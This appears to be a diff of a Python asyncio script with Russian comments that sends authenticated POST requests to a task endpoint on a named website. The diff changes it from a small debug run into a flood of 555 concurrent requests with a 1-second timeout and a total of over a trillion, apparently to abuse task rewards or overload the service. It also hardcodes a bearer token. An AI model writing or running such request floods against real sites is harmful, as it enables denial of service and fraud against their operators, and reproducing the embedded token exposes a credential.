@@ -2,15 +2,16 @@ import asyncio
 import aiohttp
 from collections import defaultdict
 import sys
+import json
 
-# ------------------- Настройки (уменьшены для отладки) -------------------
-CONCURRENT_REQUESTS = 50        # снижаем для стабильности
-TOTAL_REQUESTS = 100            # для теста сделаем 100 запросов (потом можно увеличить)
-REQUEST_TIMEOUT = 30            # таймаут побольше
-LOG_FIRST_ERRORS = 10
-# -------------------------------------------------------------------------
+# ------------------- Настройки -------------------
+CONCURRENT_REQUESTS = 555
+TOTAL_REQUESTS = 1111111111111              # для теста
+REQUEST_TIMEOUT = 1
+LOG_FIRST_RESPONSES = 50           # сколько первых ответов логировать полностью (и успешных, и ошибок)
+LOG_FULL_RESPONSE = True          # выводить заголовки и тело
+# ------------------------------------------------
 
-# Ваши данные (токен вставлен)
 TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMyMzk0OCwidGVsZWdyYW1JZCI6NjMyNTAzNzMyLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjYzNjM1MiwiZXhwIjoxNzc2NzIyNzUyfQ.oWhXOZxi-WhES7gAtMEeXrAHkl2AnJUyoHER89TZw1o"
 TASK_ID = 342
 BASE_URL = "https://maloycser.com"
@@ -22,64 +23,73 @@ HEADERS = {
     "Authorization": f"Bearer {TOKEN}",
     "Origin": BASE_URL,
     "Referer": f"{BASE_URL}/tasks",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "User-Agent": "Mozilla/5.0",
     "Content-Type": "application/json",
 }
 
-PAYLOAD = {}  # пустой JSON
+PAYLOAD = {}
 
-# Статистика
 success_count = 0
 error_count = 0
 status_counter = defaultdict(int)
-error_details = []
+raw_responses = []      # храним сырые данные первых ответов
 lock = asyncio.Lock()
-error_logged = 0
+responses_logged = 0
 start_time = None
-total_requests_sent = 0  # счётчик отправленных
+total_sent = 0
 
-async def post_request(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore) -> None:
-    global success_count, error_count, error_logged, total_requests_sent
+async def post_request(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore):
+    global success_count, error_count, responses_logged, total_sent
     async with semaphore:
         try:
-            # Отладочное сообщение (редкое, чтобы не забивать логи)
-            if total_requests_sent < 3:
-                print(f"[DEBUG] Отправка запроса...")
             async with session.post(URL, json=PAYLOAD, headers=HEADERS, timeout=REQUEST_TIMEOUT) as resp:
                 status = resp.status
+                headers = dict(resp.headers)  # заголовки ответа
                 text = await resp.text()
+                
                 async with lock:
-                    total_requests_sent += 1
+                    total_sent += 1
                     status_counter[status] += 1
                     if status == 200:
                         success_count += 1
                     else:
                         error_count += 1
-                        if error_logged < LOG_FIRST_ERRORS:
-                            error_logged += 1
-                            error_details.append({
-                                "status": status,
-                                "body": text[:500],
-                            })
-                    # Если это один из первых запросов, выводим статус сразу
-                    if total_requests_sent <= 3:
-                        print(f"[DEBUG] Ответ: статус {status}, длина тела {len(text)}")
+                    
+                    # Логируем сырой ответ для первых N запросов
+                    if responses_logged < LOG_FIRST_RESPONSES:
+                        responses_logged += 1
+                        raw_responses.append({
+                            "status": status,
+                            "headers": headers,
+                            "body": text,          # полное тело
+                        })
+                        # Сразу печатаем в консоль
+                        print(f"\n📨 СЫРОЙ ОТВЕТ #{responses_logged} (статус {status})")
+                        print("--- Заголовки ---")
+                        for k, v in headers.items():
+                            print(f"  {k}: {v}")
+                        print("--- Тело ---")
+                        print(text)
+                        print("-" * 40)
+                        sys.stdout.flush()
         except asyncio.TimeoutError:
             async with lock:
                 error_count += 1
-                total_requests_sent += 1
+                total_sent += 1
                 status_counter["timeout"] += 1
-                if error_logged < LOG_FIRST_ERRORS:
-                    error_logged += 1
-                    error_details.append({"status": "timeout", "body": f"Таймаут {REQUEST_TIMEOUT}с"})
+                if responses_logged < LOG_FIRST_RESPONSES:
+                    responses_logged += 1
+                    raw_responses.append({"status": "timeout", "body": f"Таймаут {REQUEST_TIMEOUT}с"})
+                    print(f"\n⏰ ТАЙМАУТ #{responses_logged}")
         except Exception as e:
             async with lock:
                 error_count += 1
-                total_requests_sent += 1
+                total_sent += 1
                 status_counter["exception"] += 1
-                if error_logged < LOG_FIRST_ERRORS:
-                    error_logged += 1
-                    error_details.append({"status": "exception", "body": str(e)[:500]})
+                if responses_logged < LOG_FIRST_RESPONSES:
+                    responses_logged += 1
+                    raw_responses.append({"status": "exception", "body": str(e)})
+                    print(f"\n💥 ИСКЛЮЧЕНИЕ #{responses_logged}: {e}")
 
 async def progress_reporter(total: int, interval: float = 2.0):
     while True:
@@ -90,7 +100,7 @@ async def progress_reporter(total: int, interval: float = 2.0):
         elapsed = asyncio.get_event_loop().time() - start_time
         rate = current / elapsed if elapsed > 0 else 0
         print(f"📊 {current}/{total} | ✅ {success_count} | ❌ {error_count} | {rate:.1f} з/с")
-        sys.stdout.flush()  # принудительный сброс буфера
+        sys.stdout.flush()
 
 async def main():
     global start_time
@@ -104,34 +114,18 @@ async def main():
     semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)
     connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS + 10, force_close=True)
 
-    print("[DEBUG] Создание сессии...")
-    sys.stdout.flush()
-
     async with aiohttp.ClientSession(connector=connector) as session:
-        print("[DEBUG] Сессия создана, запуск задач...")
-        sys.stdout.flush()
-        
         tasks = [asyncio.create_task(post_request(session, semaphore)) for _ in range(TOTAL_REQUESTS)]
         reporter = asyncio.create_task(progress_reporter(TOTAL_REQUESTS))
-        
-        # Ждём все запросы
         await asyncio.gather(*tasks)
         reporter.cancel()
 
-    # Финальный отчёт
     print("\n" + "=" * 60)
     print(f"✅ Успешно (200):        {success_count}")
     print(f"❌ Всего ошибок:         {error_count}")
     print("\n📋 Распределение по статусам:")
     for code, cnt in sorted(status_counter.items(), key=lambda x: -x[1]):
         print(f"   {code}: {cnt}")
-    if error_details:
-        print(f"\n🧾 Примеры ошибок (первые {len(error_details)}):")
-        for i, err in enumerate(error_details, 1):
-            print(f"\n--- Ошибка #{i} ---")
-            print(f"Статус: {err['status']}")
-            if err['body']:
-                print(f"Тело ответа:\n{err['body']}")
     print("=" * 60)
     sys.stdout.flush()
 
